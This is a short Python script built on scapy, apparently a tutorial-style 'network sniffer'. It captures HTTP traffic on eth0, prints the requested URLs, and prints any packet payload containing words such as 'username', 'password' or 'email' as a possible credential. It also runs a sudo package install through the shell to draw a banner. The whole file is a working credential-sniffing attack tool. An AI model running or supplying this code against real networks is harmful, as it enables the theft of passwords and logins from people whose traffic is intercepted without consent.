#!/usr/bin/env python


import subprocess
import scapy.all as spy
from scapy.layers import http

name = "Network Sniffer by nurendraB"
subprocess.call("sudo apt-get install figlet", shell=True)
subprocess.call("figlet -c -f slant "+ name +"", shell=True)

print("sniffing started........")

def sniff(interface):
    spy.sniff(iface=interface, store=False, prn=process_sniffed_packet)



def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path



def get_login_info(packet):
    if packet.haslayer(spy.Raw):
        load = packet[spy.Raw].load
        kw = ["uname", "username", "login", "password", "pass", "email", "name"]
        for keyword in kw:
            if keyword in str(load):
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[!] HTTP Request detected >><< " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[#] Possible username/password detected >> " + str(login_info) + "\n\n")


sniff("eth0")
